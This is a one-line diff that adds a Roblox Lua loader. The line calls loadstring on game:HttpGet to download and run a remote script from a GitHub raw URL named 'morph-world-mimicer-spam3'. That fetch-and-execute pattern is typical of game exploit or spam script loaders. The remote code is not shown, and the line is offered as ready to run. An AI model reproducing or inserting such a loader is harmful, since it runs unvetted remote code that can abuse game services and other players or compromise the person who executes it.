@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/morph-world-mimicer-spam3-u8iu198ricdd2d.lua"))()
